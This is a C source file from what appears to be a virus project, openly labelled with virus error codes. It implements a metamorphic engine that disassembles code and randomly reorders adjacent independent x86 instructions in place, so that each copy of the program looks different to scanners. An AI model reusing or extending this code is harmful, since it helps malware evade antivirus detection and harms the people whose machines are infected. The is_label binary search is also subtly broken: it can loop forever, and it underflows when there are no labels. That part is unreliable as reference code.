#include <stdbool.h>
#include <stddef.h>
#include "accessors.h"
#include "disasm.h"
#include "blocks.h"
#include "utils.h"
#include "syscalls.h"
#include "errors.h"
#include "compiler_utils.h"
#include "log_print_operands.h"

#define INSTRUCTION_PERMUT_WINDOW	4096
#define PERMUT_PASSES			2

static bool	want_to_permutate(uint64_t *seed)
{
	return random(seed) % 2;
}

static bool	can_permutate(const struct operand *a, const struct operand *b)
{
	// TODO: UNKNOWN & NONE exception
	bool	same_dest      = !!(a->dst & b->dst);
	bool	a_dst_is_b_src = !!(a->dst & b->src);
	bool	b_dst_is_a_src = !!(b->dst & a->src);

	if (same_dest || a_dst_is_b_src || b_dst_is_a_src)
	{
		return false;
	}
	return true;
}

static bool	is_label(const struct label *labels, size_t nlabels,
			struct operand *op)
{
	size_t	low = 0;
	size_t	high = nlabels - 1;
	size_t	i;

	while (true)
	{
		i = (low + high) / 2;
		if (op->addr == labels[i].location)
			return true;
		else if (low == high)
			break;
		else if (op->addr < labels[i].location)
			high = i;
		else // (op->addr > labels[i].location)
			low = i;
	}
	return false;
}

static bool	uses_reserved_registers(struct operand *a, struct operand *b)
{
	if ((a->src | a->dst | b->src | b->dst) & (RIP | RSP))
	{
		return true;
	}
	return false;
}

/* -------------------------------------------------------------------------- */

static void	permutate_neighbors(struct operand *a, struct operand *b)
{
	// small addresses first
	if (a->addr > b->addr)
	{
		permutate_neighbors(b, a);
		return ;
	}
	// check if actually neighbours!
	if (a->addr + a->length != b->addr)
		return (void)errors(ERR_VIRUS, _ERR_V_NOT_NEIGHBORS);

	// backup 1st
	uint8_t	swap_code[INSTRUCTION_MAXLEN];
	memcpy(swap_code, a->addr, a->length);

	// copy b in a
	memcpy(a->addr, b->addr, b->length);

	// copy a after that
	void	*after_b = a->addr + b->length;
	memcpy(after_b, swap_code, a->length);

	// reassign addresses
	b->addr = a->addr;
	a->addr = after_b;

	// swap instructions array position
	struct operand swap;
	swap = *a;
	*a = *b;
	*b = swap;
}

static void	maybe_permutate(struct operand *a, struct operand *b, uint64_t *seed,
			const struct label *labels, size_t nlabels)
{
	if (want_to_permutate(seed)
	&& can_permutate(a, b)
	&& !uses_reserved_registers(a, b)
	&& !is_label(labels, nlabels, b))
	{
		permutate_neighbors(a, b);
	}
}

/* -------------------------------------------------------------------------- */

size_t		total_insts_size(struct operand insts[INSTRUCTION_PERMUT_WINDOW], size_t ninsts)
{
	size_t	size = 0;
	for (size_t i = 0; i < ninsts; i++)
		size += insts[i].length;
	return size;
}

/*
** permutate_instructions
*/
bool		permutate_instructions(struct safe_ptr ref, uint64_t seed)
{
	struct block_allocation	block_memory;
	if (!disasm_block(&block_memory, ref))
		return errors(ERR_THROW, _ERR_T_PERMUTATE_INSTRUCTIONS);

	struct label	*labels = block_memory.blocks[0].labels;
	size_t		nlabels = block_memory.blocks[0].nlabels;
	size_t		curr_off = 0;

	while (true)
	{
		struct operand	insts[INSTRUCTION_PERMUT_WINDOW];
		void		*ptr = ref.ptr + curr_off;
		size_t		size = ref.size - curr_off;
		size_t		ninsts;

		ninsts = disasm_operands(insts, INSTRUCTION_PERMUT_WINDOW, ptr, size);
		debug_print_operands(insts, ninsts);

		if (ninsts < 2) break;

		for (size_t i = 0; i < ninsts * PERMUT_PASSES; i++)
		{
			for (size_t j = 0; j + 1 < ninsts; j++)
			{
				maybe_permutate(&insts[j], &insts[j + 1], &seed, labels, nlabels);
			}
		}
		curr_off += total_insts_size(insts, ninsts);
	}

	return true;
}
